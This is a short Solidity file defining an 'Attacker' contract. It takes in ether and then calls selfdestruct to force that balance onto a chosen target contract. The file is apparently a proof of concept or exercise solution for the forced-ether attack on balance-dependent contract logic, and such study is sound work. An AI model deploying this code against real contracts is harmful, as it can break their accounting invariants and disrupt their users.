// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

contract Attacker {
    address payable target;

    constructor(address payable _targetAddress) {
        target = _targetAddress;
    }

    function attack() public{

        selfdestruct(target);
    }

    receive() external payable {}
}